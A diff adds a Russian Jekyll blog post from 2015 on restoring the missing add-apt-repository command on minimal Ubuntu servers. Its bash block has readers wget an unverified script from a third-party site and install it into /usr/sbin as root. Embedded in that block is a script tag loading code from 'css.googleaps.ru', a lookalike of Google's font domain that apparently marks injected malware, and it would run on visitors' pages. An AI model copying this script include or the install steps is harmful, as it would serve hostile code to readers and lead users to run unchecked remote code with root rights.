@@ -1,0 +1,42 @@
+---
+layout: post
+status: publish
+published: true
+title: 'sudo: add-apt-repository: команда не найдена'
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+excerpt: "Иногда бывает так, что на сервере может быть установлена настолько &laquo;обрезанная&raquo;
+  версия дистрибутива, что стандартых команд в нем просто нет. Например, такие сборки
+  предосталвяют ребята из Locum, ubuntu и debian(остальные и не пробовал) они предоставляют
+  максимально почиканную, в которой нет даже команды add-apt-repository.\r\n\r\nНо,
+  на локумовских серверах не так все просто. Сервер под Ubuntu всегда будет кричать,
+  что команды такой нет, и знать я тебя не знаю. Чтобы обойти эту проблему вот что
+  надо сделать."
+wordpress_id: 499
+wordpress_url: http://devdocs.ru/?p=499
+date: '2015-05-21 12:00:24 +0200'
+date_gmt: '2015-05-21 12:00:24 +0200'
+categories:
+- Администрирование
+tags:
+- linux
+- repository
+- администрирование
+- ubuntu
+comments: []
+---
+<p>Иногда бывает так, что на сервере может быть установлена настолько &laquo;обрезанная&raquo; версия дистрибутива, что стандартых команд в нем просто нет. Например, такие сборки предосталвяют ребята из Locum, ubuntu и debian(остальные и не пробовал) они предоставляют максимально почиканную, в которой нет даже команды add-apt-repository.</p>
+<p>Но, на локумовских серверах не так все просто. Сервер под Ubuntu всегда будет кричать, что команды такой нет, и знать я тебя не знаю. Чтобы обойти эту проблему вот что надо сделать.<a id="more"></a><a id="more-499"></a></p>
+<pre class="brush: bash; gutter: true">sudo apt-get install python-software-properties<br />
+cd &#47;tmp<br />
+wget http:&#47;&#47;xaxatyxa.ru&#47;download&#47;add-apt-repository.sh.txt<br />
+sudo mv add-apt-repository.sh.txt &#47;usr&#47;sbin&#47;add-apt-repository<br />
+sudo chmod o+x &#47;usr&#47;sbin&#47;add-apt-repository<br />
+sudo chown root:root &#47;usr&#47;sbin&#47;add-apt-repository<br />
+<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre><br />
+Все готово, можно пользоваться.</p>
